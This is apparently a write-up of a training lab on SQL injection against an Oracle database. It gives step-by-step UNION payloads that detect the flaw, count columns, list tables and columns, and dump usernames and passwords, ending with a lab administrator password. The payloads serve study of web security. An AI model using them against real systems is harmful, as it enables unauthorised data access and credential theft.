# 🤖 SQL Injection: Listing database contents on Oracle

**Lab Description:** This lab contains an SQL injection vulnerability in the product category filter. The application runs on an **Oracle** database.

## 1. Reconnaissance (Trinh sát)🚀
* **Detection:** Appended `'` to the URL parameter `category`.
    * Result: `Internal Server Error` (500).
* **Database Identification:**
    * Tried `category=Gifts'--` -> Error (Oracle requires `FROM` clause).
    * Tried `UNION SELECT 'abc', NULL FROM dual--` -> **Success**.✔️
    * Conclusion: **Oracle Database** confirmed.🏁

## 2. Exploitation Steps

**Step 1: Determine number of columns**
Payload: `' ORDER BY 1--` (Success), `' ORDER BY 2--` (Success), `' ORDER BY 3--` (Error).
-> **Result:** 2 Columns.

**Step 2: Find table names**
Since it's Oracle, I cannot use `information_schema`. Instead, I queried `all_tables`.
Payload:
```sql
' UNION SELECT table_name, NULL FROM all_tables--
```
-> Found table: USERS_BFWPQR


**Step 3:Find column name. I use all_tab_columns** 
Payload:
```sql
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_BFWPQR'--
```
-> Found columns: USERNAME_JCXAJS, PASSWORD_EXOQQI


**Step 4: Dump Data(same contruct lab-02)**
Payload:
```sql
' UNION SELECT USERNAME_JCXAJS, PASSWORD_EXOQQI FROM  USERS_BFWPQR--
```
-> Result account: administrator / password: 3vmps0y2vn65awkpkqyp
